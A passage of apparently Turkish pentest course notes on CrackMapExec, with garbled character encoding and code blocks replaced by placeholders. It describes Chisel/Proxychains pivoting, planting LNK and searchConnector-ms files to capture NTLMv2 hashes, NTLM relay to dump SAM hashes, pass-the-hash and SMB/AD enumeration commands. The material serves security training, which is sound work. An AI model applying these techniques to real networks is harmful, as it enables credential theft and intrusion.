{{CODE_BLOCK_96}}

Not: SabÄ±rlÄ± olmamÄ±z gerekiyor. PaylaÅŸÄ±lan klasÃ¶r ve dosya sayÄ±sÄ±na baÄŸlÄ± olarak iÅŸlem birkaÃ§ dakika sÃ¼rebilir

`spider_plus` modÃ¼lÃ¼ iÃ§in mevcut tÃ¼m seÃ§enekleri gÃ¶rÃ¼ntÃ¼lemek iÃ§in `--options` seÃ§eneÄŸini kullanabiliriz:


### Spider_plus Options

{{CODE_BLOCK_97}}

Bir sonraki bÃ¶lÃ¼mde CrackMapExec'in bir `proxy` aracÄ±lÄ±ÄŸÄ±yla diÄŸer aÄŸlara ulaÅŸmak iÃ§in nasÄ±l kullanÄ±lacaÄŸÄ± anlatÄ±lacaktÄ±r.


---


### Proxychains with CME

### Scenario

Ä°nternal bir Pentest Ã¼zerinde Ã§alÄ±ÅŸÄ±yoruz. Bir aÄŸ taramasÄ± gerÃ§ekleÅŸtirdik ve yalnÄ±zca bir host (10.129.204.133) tespit edip ele geÃ§irebildik. Ele geÃ§irilen bu host Ã¼zerinde `ipconfig` Ã§alÄ±ÅŸtÄ±rdÄ±ÄŸÄ±mÄ±zda, iki aÄŸ baÄŸdaÅŸtÄ±rÄ±cÄ±sÄ± olduÄŸunu fark ettik. ARP tablosu `172.16.1.10` IP adresine sahip baÅŸka bir hostu gÃ¶steriyor. TopladÄ±ÄŸÄ±mÄ±z bilgilere dayanarak aÅŸaÄŸÄ±daki senaryoya sahibiz:

![Pasted image 20241202141946.png](/img/user/resimler/Pasted%20image%2020241202141946.png)

DC01'e ve bu aÄŸdaki (172.16.1.0/24) herhangi bir makineye saldÄ±rmak iÃ§in, saldÄ±rÄ± hostumuz ile MS01 arasÄ±nda bir `tÃ¼nel` kurmalÄ±yÄ±z. Bu nedenle, CME tarafÄ±ndan yÃ¼rÃ¼tÃ¼len tÃ¼m komutlar MS01 Ã¼zerinden geÃ§er.


### Set Up the Tunnel

TÃ¼nelimizi kurmak iÃ§in [Chisel](https://github.com/jpillora/chisel) kullanacaÄŸÄ±z. [Release](https://github.com/jpillora/chisel/releases)'e gidelim ve saldÄ±racaÄŸÄ±mÄ±z makinemiz iÃ§in en son Windows binary'sini ve saldÄ±rÄ± hostumuzda kullanmak iÃ§in en yeni Linux binary'sini indirelim ve aÅŸaÄŸÄ±daki adÄ±mlarÄ± gerÃ§ekleÅŸtirelim:

*  Chisel'Ä± SaldÄ±rÄ± Hostumuza indirin ve Ã‡alÄ±ÅŸtÄ±rÄ±n:

### Chisel - Reverse Tunnel

{{CODE_BLOCK_98}}


*  Chisel for Windows'u Ä°ndirin ve Hedef Host'a YÃ¼kleyin:


### Upload Chisel

{{CODE_BLOCK_99}}


* CrackMapExec komut yÃ¼rÃ¼tme seÃ§eneÄŸi `-x`'i kullanarak Chisel sunucumuza baÄŸlanmak iÃ§in `chisel.exe` dosyasÄ±nÄ± Ã§alÄ±ÅŸtÄ±rÄ±n (Bu seÃ§eneÄŸi Komut YÃ¼rÃ¼tme bÃ¶lÃ¼mÃ¼nde daha fazla tartÄ±ÅŸacaÄŸÄ±z)


### Connect to the Chisel Server

{{CODE_BLOCK_100}}

Bu terminaldeki komut, hedef makinadaki **Chisel** process'ini durdurana kadar Ã§alÄ±ÅŸmaya devam edecektir. Bunu bu bÃ¶lÃ¼mde daha sonra yapacaÄŸÄ±z.

**Attack host** Ã¼zerinde, **Chisel server** Ã§Ä±ktÄ±sÄ±nda **bir client baÄŸlantÄ±sÄ± aldÄ±ÄŸÄ±mÄ±zÄ± ve tÃ¼neli baÅŸlattÄ±ÄŸÄ±mÄ±zÄ±** gÃ¶steren yeni bir satÄ±r gÃ¶rmeliyiz.

### Chisel Receiving Session No. 1

{{CODE_BLOCK_101}}

TCP 1080 portunun dinlenip dinlenmediÄŸini kontrol ederek de tÃ¼nelin Ã§alÄ±ÅŸtÄ±ÄŸÄ±nÄ± doÄŸrulayabiliriz:


### Check Listening Port

{{CODE_BLOCK_102}}

* Proxyychains'i Chisel varsayÄ±lan portu `TCP 1080`'i kullanacak ÅŸekilde yapÄ±landÄ±rmamÄ±z gerekir. YapÄ±landÄ±rma dosyasÄ±nÄ±n ProxyList bÃ¶lÃ¼mÃ¼ne `socks5 127.0.0.1 1080`'i aÅŸaÄŸÄ±daki gibi eklediÄŸimizden emin olmamÄ±z gerekiyor:


### Configure Proxychains

{{CODE_BLOCK_103}}

* ArtÄ±k 172.16.1.10 IP'sine ulaÅŸmak iÃ§in `Proxychains` aracÄ±lÄ±ÄŸÄ±yla CrackMapExec'i kullanabiliriz:

### CrackMapExec'in Proxychains ile Test Edilmesi

{{CODE_BLOCK_104}}


Proxychains Ã§Ä±ktÄ±sÄ±nÄ± konsoldan kaldÄ±rmak iÃ§in `Proxychains4` ve `quiet -q` seÃ§eneÄŸini kullanabiliriz:

### Quiet SeÃ§eneÄŸi ile Proxychains4

{{CODE_BLOCK_105}}

Proxychains aracÄ±lÄ±ÄŸÄ±yla herhangi bir CME iÅŸlemi gerÃ§ekleÅŸtirebiliriz.


### Killing Chisel on the Target Machine

Ä°ÅŸimiz bittiÄŸinde, Chisel process'ini kill etmemiz gerekir. Bunu yapmak iÃ§in, PowerShell komutlarÄ±nÄ± yÃ¼rÃ¼tmek iÃ§in `-X` seÃ§eneÄŸini kullanacaÄŸÄ±z ve PowerShell komutunu Ã§alÄ±ÅŸtÄ±racaÄŸÄ±z `Stop-Process - Name chisel -Force .` Komut yÃ¼rÃ¼tme konusunu Komut YÃ¼rÃ¼tme bÃ¶lÃ¼mÃ¼nde daha ayrÄ±ntÄ±lÄ± olarak ele alacaÄŸÄ±z.


### Kill the Chisel Client

{{CODE_BLOCK_106}}

Bunu yaptÄ±ktan sonra, Chisel client komutunu Ã§alÄ±ÅŸtÄ±rdÄ±ÄŸÄ±mÄ±z terminal aÅŸaÄŸÄ±daki gibi sonuÃ§lanmalÄ±dÄ±r:


### Chisel'i Zorla Durdurduktan Sonra Terminalin KapanmasÄ±

{{CODE_BLOCK_107}}

ArtÄ±k saldÄ±rÄ± konaÄŸÄ±mÄ±zdaki Chisel sunucusunu CTRL + C ile kapatabiliriz.


### Attack Host Ãœzerinde Chisel'i Kapatma

{{CODE_BLOCK_108}}


### Sunucu olarak Windows ve Client olarak Linux

Chisel'i Windows workstation'da bir sunucu olarak baÅŸlatarak ve saldÄ±rÄ± hostumuzu client olarak kullanarak bunun tersini de yapabiliriz. Chisel'i sunucu olarak baÅŸlatmak iÃ§in `server --socks5` seÃ§eneÄŸini kullanacaÄŸÄ±z.


### Chisel'i Hedef Makinede Sunucu Olarak BaÅŸlatma

{{CODE_BLOCK_109}}

Åimdi hedef makinemiz Chisel sunucusuna baÄŸlanmak ve proxy'yi etkinleÅŸtirmek iÃ§in IP ve porttan sonra `socks` seÃ§eneÄŸini kullanmamÄ±z gerekiyor.


### Attack Hostumuzdan Chisel Sunucusuna BaÄŸlanma

{{CODE_BLOCK_110}}

Åimdi Proxychains'i tekrar kullanabiliriz:

### Internal Network'e BaÄŸlanmak iÃ§in Proxy Chain'i Kullanma

{{CODE_BLOCK_111}}

Bu bÃ¶lÃ¼mde, **attack host** Ã¼zerinde **Proxychains** ve **Chisel** yapÄ±landÄ±rmayÄ± ve **CrackMapExec** kullanarak hedef makinede **Chisel** Ã§alÄ±ÅŸtÄ±rmayÄ± Ã¶ÄŸrendik.

Ä°lerleyen bÃ¶lÃ¼mlerde, diÄŸer aÄŸlara ulaÅŸmak iÃ§in `CrackMapExec` ve `Proxychains` kullanacaÄŸÄ±z.

---

### Stealing Hashes

Yeni hesaplarÄ± ele geÃ§irmek iÃ§in kullanÄ±lan en yaygÄ±n tekniklerden biri parola hashlerinin Ã§alÄ±nmasÄ±dÄ±r. Bunu baÅŸarmanÄ±n farklÄ± yÃ¶ntemleri vardÄ±r, ancak yaygÄ±n olanÄ±, bir bilgisayarÄ± veya kullanÄ±cÄ±yÄ± kontrol ettiÄŸimiz sahte bir paylaÅŸÄ±lan klasÃ¶rle bir kimlik doÄŸrulama iÅŸlemi baÅŸlatmaya zorlamaktÄ±r.

Bu kimlik doÄŸrulama iÅŸlemini baÅŸlatÄ±rken, kullanÄ±cÄ± veya bilgisayar bunu bir NTLMv2 hash'i ile yapar. Bu hash, Hashcat gibi bir araÃ§ kullanÄ±larak kÄ±rÄ±labilir veya kimlik bilgilerini bilmeden kullanÄ±cÄ±nÄ±n kimliÄŸine bÃ¼rÃ¼nmek iÃ§in baÅŸka bir bilgisayara iletilebilir.

PaylaÅŸÄ±lan klasÃ¶rleri kullanarak hash'leri Ã§almak iÃ§in bir kÄ±sayol oluÅŸturabilir ve kÄ±sayolda gÃ¶rÃ¼nen simge sahte paylaÅŸÄ±lan klasÃ¶rÃ¼mÃ¼zÃ¼ gÃ¶sterecek ÅŸekilde yapÄ±landÄ±rabiliriz. KullanÄ±cÄ± paylaÅŸÄ±lan klasÃ¶re girdiÄŸinde, simgenin konumunu aramaya Ã§alÄ±ÅŸacak ve paylaÅŸÄ±lan klasÃ¶rÃ¼mÃ¼ze karÅŸÄ± kimlik doÄŸrulamasÄ±nÄ± zorlayacaktÄ±r.

NTLMv2 hash'lerini toplama hakkÄ±nda daha fazla bilgi edinmek iÃ§in RedTeam Ekipler iÃ§in [Farming blogunu okuyabiliriz: MDsec'ten NetNTLM hasadÄ±](https://www.mdsec.co.uk/2021/02/farming-for-red-teams-harvesting-netntlm/), sadece kÄ±sayollarÄ±n kullanÄ±mÄ±nÄ± deÄŸil, aynÄ± amaca hizmet eden diÄŸer dosya tÃ¼rlerini de gÃ¶sterir.


### Slinky ModÃ¼lÃ¼

`Slinky`, [@byt3bl33d3r](https://twitter.com/byt3bl33d3r) tarafÄ±ndan oluÅŸturulan bir modÃ¼ldÃ¼r ve CME'deki en heyecan verici modÃ¼llerden biridir. Prensip basittir. ModÃ¼l, yazma izinlerine sahip tÃ¼m paylaÅŸÄ±mlarda belirtilen SMB sunucusuna bir UNC yolu iÃ§eren simge attribute'a sahip Windows kÄ±sayollarÄ± oluÅŸturur. Birisi paylaÅŸÄ±mÄ± ziyaret ettiÄŸinde, simge attribute'u sunucumuza giden bir UNC yolu iÃ§erdiÄŸi iÃ§in `Responder` kullanarak NTLMv2 hash'ini alacaÄŸÄ±z.

ModÃ¼lÃ¼n `SERVER` ve `NAME` olmak Ã¼zere iki zorunlu seÃ§eneÄŸi ve bir isteÄŸe baÄŸlÄ± `CLEANUP` seÃ§eneÄŸi vardÄ±r.


### Slinky Module Options

{{CODE_BLOCK_112}}

`SERVER`, kontrol ettiÄŸimiz SMB sunucusunun IP'sine ve UNC yolunun iÅŸaret etmesini istediÄŸimiz yere karÅŸÄ±lÄ±k gelir. `NAME` seÃ§eneÄŸi kÄ±sayol dosyasÄ±na bir isim atar, `CLEANUP` ise iÅŸimiz bittiÄŸinde kÄ±sayolu silmek iÃ§indir.


### Chisel kullanarak baÄŸlama

Bu alÄ±ÅŸtÄ±rma iÃ§in lokal eriÅŸimi simÃ¼le edeceÄŸiz ve internal aÄŸa baÄŸlanmak iÃ§in Chisel ve Proxychains kullanacaÄŸÄ±z. Chisel zaten hedef makinemizde bir sunucu olarak Ã§alÄ±ÅŸÄ±yor ve bir client olarak baÄŸlanmamÄ±z ve daha sonra internal aÄŸÄ± numaralandÄ±rmak iÃ§in proxychains kullanmamÄ±z gerekiyor. Chisel kullanarak baÄŸlanmak iÃ§in aÅŸaÄŸÄ±daki komutu **kullanalÄ±m**


### Hedef Makine Chisel Sunucusuna BaÄŸlanma

{{CODE_BLOCK_113}}


### NTLMv2 Hash'lerinin Ã‡alÄ±nmasÄ±
Ä°lk olarak, `--shares` seÃ§eneÄŸini kullanarak `grace` kullanÄ±cÄ±sÄ±nÄ±n `WRITE` ayrÄ±calÄ±klarÄ±na sahip olduÄŸu bir paylaÅŸÄ±m bulalÄ±m:

### WRITE AyrÄ±calÄ±klarÄ±na Sahip PaylaÅŸÄ±mlarÄ± Bulma

{{CODE_BLOCK_114}}


GÃ¶rdÃ¼ÄŸÃ¼mÃ¼z gibi, `grace` `HR` ve `IT-Tools` paylaÅŸÄ±mlarÄ±na yazabilir. Bu nedenle her bir paylaÅŸÄ±ma bir `LNK` dosyasÄ± yazmak iÃ§in `Slinky` modÃ¼lÃ¼nÃ¼ kullanabiliriz. 

**SERVER=10.10.14.33** seÃ§eneÄŸini kullanarak **attack host**'umuzun **tun0** aÄŸÄ±ndaki **IP adresini** belirteceÄŸiz ve **NAME=important** seÃ§eneÄŸiyle **LNK dosyasÄ±na atanacak dosya adÄ±nÄ±** belirleyeceÄŸiz.


### Using Slinky

{{CODE_BLOCK_115}}


![Pasted image 20241202171933.png](/img/user/resimler/Pasted%20image%2020241202171933.png)

**Not:** **CrackMapExec**, genellikle **`OpSec` aÃ§Ä±sÄ±ndan gÃ¼venli** olarak kabul edilir Ã§Ã¼nkÃ¼ tÃ¼m iÅŸlemler ya **`bellekte` Ã§alÄ±ÅŸtÄ±rÄ±lÄ±r**, ya **`WinAPI` Ã§aÄŸrÄ±larÄ±yla aÄŸ Ã¼zerinden sorgulanÄ±r**, ya da **Windows'un built-in araÃ§larÄ±/Ã¶zellikleri** kullanÄ±larak gerÃ§ekleÅŸtirilir.

Bu gereksinimleri karÅŸÄ±lamayan bir modÃ¼l Ã§alÄ±ÅŸtÄ±rmaya Ã§alÄ±ÅŸtÄ±ÄŸÄ±mÄ±zda, **Ã¶nceden bir uyarÄ± alÄ±rÄ±z**. **`Slinky`** modÃ¼lÃ¼, **OpSec aÃ§Ä±sÄ±ndan gÃ¼venli olmayan** bir modÃ¼le Ã¶rnektir. Devam etmeden Ã¶nce **bir uyarÄ± alacaÄŸÄ±z**.

LNK dosyasÄ± oluÅŸturulduktan sonra, Responder'Ä± Ã§alÄ±ÅŸtÄ±rmamÄ±z ve birinin paylaÅŸÄ±ma gÃ¶z atmasÄ±nÄ± beklememiz gerekir. 


### Starting Responder

{{CODE_BLOCK_116}}

Not: Hash'i yakalamak iÃ§in `Responder.conf` dosyasÄ±nda SMB seÃ§eneÄŸi `On` olmalÄ±dÄ±r.

NTLMv2 hash'imizi aldÄ±k ve hesabÄ± kullanmak iÃ§in onu kÄ±rmamÄ±z gerekiyor veya bir `NTLM Relay` yapabiliriz. Bunu kÄ±rmak iÃ§in, `ASREPRoast` ve `Kerberoasting` ile yaptÄ±ÄŸÄ±mÄ±z gibi `Hashcat mod 5600`'Ã¼ kullanabiliriz. `NTLM Relay`'e odaklanalÄ±m.


### **NTLM Relay**

DiÄŸer bir Ã§Ã¶zÃ¼m ise NTLMv2 hash'ini doÄŸrudan `SMB Sign`'nÄ±n devre dÄ±ÅŸÄ± bÄ±rakÄ±ldÄ±ÄŸÄ± aÄŸdaki diÄŸer sunuculara ve workstation'lara iletmektir. SMB Sign Ã§ok Ã¶nemlidir Ã§Ã¼nkÃ¼ bir bilgisayarda SMB Sign etkinse, saldÄ±rÄ± hostumuzun kimliÄŸini kanÄ±tlayamayacaÄŸÄ±mÄ±z iÃ§in o bilgisayara relay yapamayÄ±z. SMB Sign'nÄ±n devre dÄ±ÅŸÄ± bÄ±rakÄ±ldÄ±ÄŸÄ± hedeflerin bir listesini almak iÃ§in `--gen-relay-list` seÃ§eneÄŸini kullanabiliriz.

Åimdi Proxychains'i kullanabilir ve SMB Sign devre dÄ±ÅŸÄ± bÄ±rakÄ±lmÄ±ÅŸ makinelerin bir listesini alabiliriz

### Getting Relay List

{{CODE_BLOCK_117}}


**`ntlmrelayx`** aracÄ±nÄ±, daha Ã¶nce **`--gen-relay-list`** seÃ§eneÄŸiyle elde ettiÄŸimiz listeyle birlikte kullanacaÄŸÄ±z.

Hedef makinede **local administrator** ayrÄ±calÄ±klarÄ±na sahip bir hesap bulursak ve ek seÃ§enekler belirtmezsek, **`ntlmrelayx`** otomatik olarak hedef makinenin **`SAM` database**'ini dump edecektir. Bu sayede, herhangi bir **local admin kullanÄ±cÄ±sÄ±nÄ±n hash'leriyle** bir **`pass-the-hash attack`** gerÃ§ekleÅŸtirmeyi deneyebiliriz.

### Execute NTLMRelayX

{{CODE_BLOCK_118}}

Bir kullanÄ±cÄ±nÄ±n **SMB share**'ine eriÅŸmesini beklemeliyiz. **LNK dosyamÄ±z**, kullanÄ±cÄ±nÄ±n hedef makinemize baÄŸlanmasÄ±nÄ± zorlar (**bu iÅŸlem arka planda gerÃ§ekleÅŸir ve kullanÄ±cÄ± herhangi bir anormallik fark etmez**).

Bu gerÃ§ekleÅŸtiÄŸinde, **`ntlmrelayx`** konsolunda aÅŸaÄŸÄ±dakine benzer bir Ã§Ä±ktÄ± gÃ¶rmeliyiz:

{{CODE_BLOCK_119}}

ArdÄ±ndan, administrator hash'ini kullanarak hedef makinede kimlik doÄŸrulamasÄ± yapmak iÃ§in crackmapexec'i kullanabiliriz:

### Local HesaplarÄ± Test Etme

{{CODE_BLOCK_120}}

### Her Åeyi Temizleyin

ModÃ¼lÃ¼ kullandÄ±ktan sonra, **LNK dosyasÄ±nÄ± temizlemek** iÃ§in **`-o CLEANUP=YES`** seÃ§eneÄŸini ve **LNK dosyasÄ±nÄ±n adÄ±nÄ±** (**`NAME=important`**) belirtmek kritik Ã¶nem taÅŸÄ±r.

### Cleanup

{{CODE_BLOCK_121}}

### drop-sc ModÃ¼lÃ¼ ile Hash'lerin Ã‡alÄ±nmasÄ±

Bu bÃ¶lÃ¼mÃ¼ tamamlamadan Ã¶nce, **LNK** dÄ±ÅŸÄ±nda baÅŸka bir dosya formatÄ± kullanarak kimlik doÄŸrulamasÄ±nÄ± zorlamanÄ±n baÅŸka bir yÃ¶ntemine bakalÄ±m: **[.searchConnector-ms](https://learn.microsoft.com/en-us/windows/win32/search/search-sconn-desc-schema-entry)** ve **`.library-ms`** formatlarÄ±. Bu dosya formatlarÄ±nÄ±n Ã§oÄŸu Windows sÃ¼rÃ¼mÃ¼nde **varsayÄ±lan dosya iliÅŸkilendirmeleri** bulunur. Windows ile entegre Ã§alÄ±ÅŸarak iÃ§eriÄŸi rastgele bir konumdan, hatta **`WebDAV` paylaÅŸÄ±mÄ±yla belirtilen remote bir konumdan** gÃ¶sterebilirler.

Ã–zetle, bu dosyalar **LNK** dosyasÄ±yla aynÄ± iÅŸlevi gÃ¶rÃ¼r. Bu yÃ¶ntemin keÅŸfi hakkÄ±nda daha fazla bilgi edinmek iÃ§in **"[Exploring search connectors and library files in Windows](https://dtm.uk/exploring-search-connectors-and-library-files-on-windows/)"** baÅŸlÄ±klÄ± blog yazÄ±sÄ±nÄ± okuyabiliriz.

CrackMapExec, **`drop-sc`** adÄ±nda bir modÃ¼le sahiptir. Bu modÃ¼l, paylaÅŸÄ±lan bir klasÃ¶rde **`searchConnector-ms`** dosyasÄ± oluÅŸturmamÄ±za olanak tanÄ±r. Kullanabilmek iÃ§in **URL** seÃ§eneÄŸini belirterek **SMB fake sunucumuzu** hedef gÃ¶stermemiz gerekir. Bu durumda, **`ntlmrelayx`** Ã§alÄ±ÅŸtÄ±ran hostumuz olacaktÄ±r. **URL** deÄŸeri Ã§ift ters eÄŸik Ã§izgi (`\`) ile kaÃ§Ä±rÄ±lmalÄ±dÄ±r. Ã–rneÄŸin: **`URL=\\10.10.14.33\secret`**.

Ä°steÄŸe baÄŸlÄ± olarak aÅŸaÄŸÄ±daki seÃ§enekleri belirleyebiliriz:

* `SHARE=name` seÃ§eneÄŸi ile hedef paylaÅŸÄ±mlÄ± klasÃ¶r . Bu seÃ§eneÄŸi belirtmezsek, dosyayÄ± `WRITE` izinlerine sahip tÃ¼m paylaÅŸÄ±mlara yazacaktÄ±r

* `FILENAME=name` seÃ§eneÄŸi ile dosya adÄ± . Bu seÃ§eneÄŸi belirtmezsek, â€œ`Documents`â€ adÄ±nda bir dosya oluÅŸturacaktÄ±r.

* OluÅŸturduÄŸumuz dosyalarÄ± temizlemek istiyorsak `CLEANUP=True` seÃ§eneÄŸi. EÄŸer Ã¶zel bir isim kullanacaksak filename seÃ§eneÄŸini belirtmemiz gerekiyor.

Drop-sc'yi iÅŸ baÅŸÄ±nda gÃ¶relim:

### Dropping a searchConnector-ms File

{{CODE_BLOCK_122}}

{{CODE_BLOCK_123}}

Bir kullanÄ±cÄ± **paylaÅŸÄ±lan klasÃ¶re** eriÅŸtiÄŸinde ve **ntlmrelayx** dinleme modunda Ã§alÄ±ÅŸÄ±rken, kimlik bilgilerini **hedef makineye yÃ¶nlendirebilmemiz** gerekir.

### NTLMRelayx ve drop-sc Kullanarak YÃ¶nlendirme

{{CODE_BLOCK_124}}

Son olarak, `CLEANUP=True` seÃ§eneÄŸi ile `.searchConnector-ms` dosyasÄ±nÄ± temizleyebiliriz:


### searchConnector-ms DosyalarÄ±nÄ± Temizleme

{{CODE_BLOCK_125}}


LNK dosyalarÄ± genellikle bu tÃ¼r saldÄ±rÄ±lar iÃ§in bilinir. `.searchConnector-ms` gibi baÅŸka bir dosya tÃ¼rÃ¼ kullanmak, fark edilmemenize yardÄ±mcÄ± olabilir.

Sonraki bÃ¶lÃ¼mlerde CrackMapExec'in keÅŸif seÃ§eneklerini inceleyeceÄŸiz.

---


### SMB ile Mapping ve Enumeration

CrackMapExec, geÃ§erli bir domain kullanÄ±cÄ± hesabÄ±yla numaralandÄ±rma sÃ¶z konusu olduÄŸunda Ã§ok daha fazla seÃ§enekle birlikte gelir. En Ã§ok kullanÄ±lan seÃ§enekleri ele aldÄ±k, ancak daha derine inelim. Ä°ÅŸte ayrÄ±calÄ±klÄ± olmasa bile geÃ§erli bir hesap aldÄ±ÄŸÄ±mÄ±zda kullanabileceÄŸimiz tÃ¼m seÃ§eneklerin listesi:

| Komut                                                                 | AÃ§Ä±klama                                                          |
| --------------------------------------------------------------------- | ----------------------------------------------------------------- |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --loggedon-users` | Hedefte oturum aÃ§mÄ±ÅŸ kullanÄ±cÄ±larÄ± listeler.                      |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --sessions`       | Hedefteki aktif oturumlarÄ± listeler.                              |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --disks`          | Hedefteki diskleri listeler.                                      |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --computers`      | Hedef aÄŸdaki bilgisayarlarÄ± listeler.                             |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --wmi`            | Belirtilen WMI sorgusunu Ã§alÄ±ÅŸtÄ±rÄ±r.                              |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --wmi-namespace`  | WMI Namespaceâ€™ini belirtir (varsayÄ±lan: `root\cimv2`).            |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --rid-brute`      | Hedef Ã¼zerinde RID brute-force yÃ¶ntemiyle kullanÄ±cÄ±larÄ± listeler. |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --local-groups`   | Local gruplarÄ± listeler; grup belirtilirse Ã¼yelerini listeler.    |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --shares`         | Hedefteki tÃ¼m paylaÅŸÄ±m izinlerini listeler.                       |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --users`          | Hedefteki domain kullanÄ±cÄ±larÄ±nÄ± listeler.                        |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --groups`         | Hedefteki domain gruplarÄ±nÄ± listeler.                             |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --pass-pol`       | Domainin password policy'sini gÃ¶sterir.                           |

Daha Ã¶nce Ã§alÄ±ÅŸmamÄ±ÅŸ olanlarÄ± gÃ¶zden geÃ§irelim:

### Hedefteki aktif oturumlarÄ± / oturum aÃ§mÄ±ÅŸ kullanÄ±cÄ±larÄ± numaralandÄ±rma

Birden fazla hedefi ele geÃ§irmiÅŸsek, aktif oturumlarÄ± kontrol etmek faydalÄ± olabilir, belki bir domain administrator vardÄ±r ve bu belirli hedefe odaklanmamÄ±z gerekebilir. Bir bilgisayardaki kullanÄ±cÄ±larÄ± tespit etmek iÃ§in `--sessions` ve `--loggedon-users` seÃ§eneklerini kullanabiliriz. Session'lar, kullanÄ±cÄ±nÄ±n hedef makinede giriÅŸ yapmÄ±yor olsa da kullanÄ±cÄ± kimlik bilgileriyle oturum aÃ§Ä±ldÄ±ÄŸÄ± anlamÄ±na gelir. GiriÅŸ yapmÄ±ÅŸ kullanÄ±cÄ±lar ise kendiliÄŸinden anlaÅŸÄ±lÄ±r; bir kullanÄ±cÄ±nÄ±n hedef makineye giriÅŸ yapmÄ±ÅŸ olduÄŸunu ifade eder. `BloodHound`, aktif oturumlarÄ± bulmak iÃ§in kullanabileceÄŸimiz bir diÄŸer araÃ§tÄ±r.


### Sessions ve loggendon-users seÃ§eneklerini kullanma

{{CODE_BLOCK_126}}

Belirli bir kullanÄ±cÄ±yÄ± arÄ±yorsak, -`-loggedon-users-filter` seÃ§eneÄŸini ve ardÄ±ndan aradÄ±ÄŸÄ±mÄ±z kullanÄ±cÄ±nÄ±n adÄ±nÄ± kullanabiliriz. Birden fazla kullanÄ±cÄ± arÄ±yorsak, `regex`'i de destekler.


### Oturum aÃ§mÄ±ÅŸ kullanÄ±cÄ±larla filtre seÃ§eneÄŸini kullanma

{{CODE_BLOCK_127}}

Not: Genellikle, `--loggedon-users` veya `--sessions` parametrelerinin baÅŸarÄ±lÄ± bir ÅŸekilde Ã§alÄ±ÅŸtÄ±rÄ±labilmesi iÃ§in administrator izinleri gereklidir.



### Enumerate Computers

CME ayrÄ±ca domain bilgisayarlarÄ±nÄ± da listeleyebilir ve bunu bir LDAP isteÄŸi gerÃ§ekleÅŸtirerek yapar

### Domain'deki BilgisayarlarÄ± NumaralandÄ±rma

{{CODE_BLOCK_128}}


Not: Bu seÃ§enek yalnÄ±zca SMB protokolÃ¼nde mevcut olsa da, CME bir LDAP sorgusu yapmaktadÄ±r.


### Enumerate LAPS

Local Administrator Password Solution (LAPS), domain'e baÄŸlÄ± bilgisayarlarÄ±n local hesap parolalarÄ±nÄ±n yÃ¶netimini saÄŸlar. Parolalar Active Directory'de (AD) saklanÄ±r ve ACL tarafÄ±ndan korunur, bÃ¶ylece yalnÄ±zca uygun kullanÄ±cÄ±lar bunlarÄ± okuyabilir veya sÄ±fÄ±rlama talebinde bulunabilir. LAPS domain iÃ§inde kullanÄ±lÄ±yorsa ve LAPS ÅŸifrelerini okuyabilen bir hesabÄ± tehlikeye atarsak, `--laps` seÃ§eneÄŸini bir hedef listesi ile kullanabilir ve komutlarÄ± Ã§alÄ±ÅŸtÄ±rabilir veya `--sam` gibi diÄŸer seÃ§enekleri kullanabiliriz.


{{CODE_BLOCK_129}}

Not: EÄŸer varsayÄ±lan administrator hesap adÄ± "`administrator`" deÄŸilse, -`-laps username` seÃ§eneÄŸinden sonra kullanÄ±cÄ± adÄ±nÄ± ekleyin.

### Hedefteki RID'yi Brute-forcing yaparak KullanÄ±cÄ±larÄ± NumaralandÄ±r --rid-brute

Nadiren kullanÄ±lan bir Ã¶zellik, kullanÄ±cÄ± listeleri oluÅŸturmak iÃ§in `RID Bruteforce`'dur. `BloodHound` veya `PowerView` ile bir kullanÄ±cÄ± listesi oluÅŸturabiliriz. Ancak, bu teknikler muhtemelen yakalanacak ve kurulumu biraz zaman alacaktÄ±r. CrackMapExec'in `--rid-brute` seÃ§eneÄŸini kullanarak, UserID'sini brute forcing yaparak bir kullanÄ±cÄ± listesi toplamak mÃ¼mkÃ¼ndÃ¼r.


### List Local Users

{{CODE_BLOCK_130}}

VarsayÄ±lan olarak, `--rid-brute 4000`'e kadar RID'leri zorlayarak objeleri numaralandÄ±rÄ±r. DavranÄ±ÅŸÄ±nÄ± `--rid-brute [MAX_RID]` kullanarak deÄŸiÅŸtirebiliriz.

`--rid-brute` seÃ§eneÄŸi, brute ile zorlanan kimliklerle eÅŸleÅŸen kullanÄ±cÄ± adlarÄ±nÄ± ve diÄŸer Active Directory objeleri almak iÃ§in kullanÄ±labilir. `NULL Authentication` etkinleÅŸtirilmiÅŸse domain hesaplarÄ±nÄ± numaralandÄ±rmak iÃ§in de kullanÄ±labilir. Bu seÃ§eneÄŸin bu ÅŸekillerde kullanÄ±labileceÄŸini unutmamak Ã¶nemlidir.

### Enumerate Disks

Bazen kontrol etmeyi hatÄ±rlamamÄ±z gereken Ã¶nemli bir parÃ§a, bir sunucuda bulunabilecek ek disklerdir. CrackMapExec, sunucuda var olan diskleri kontrol etmemizi saÄŸlayan bir `--disks` seÃ§eneÄŸine sahiptir.

### Enumerating Disks

{{CODE_BLOCK_131}}


### Local ve Domain GruplarÄ±nÄ± NumaralandÄ±rma

Local-groups ile local gruplarÄ± veya `--groups` ile domain gruplarÄ±nÄ± listeleyebiliriz.

### Enumerating Local Groups

{{CODE_BLOCK_132}}

### Enumerating Domain Groups

{{CODE_BLOCK_133}}


EÄŸer grup Ã¼yelerini almak istiyorsak, `--groups [GRUP ADI]` kullanabiliriz.


### Group **Members**

{{CODE_BLOCK_134}}

Not: YazÄ±m sÄ±rasÄ±nda `--local-group` yalnÄ±zca bir Domain Controller'a karÅŸÄ± Ã§alÄ±ÅŸÄ±r ve grup adÄ±nÄ± kullanarak bir grubu sorgulamak iÅŸe yaramaz.


### WMI Sorgulama

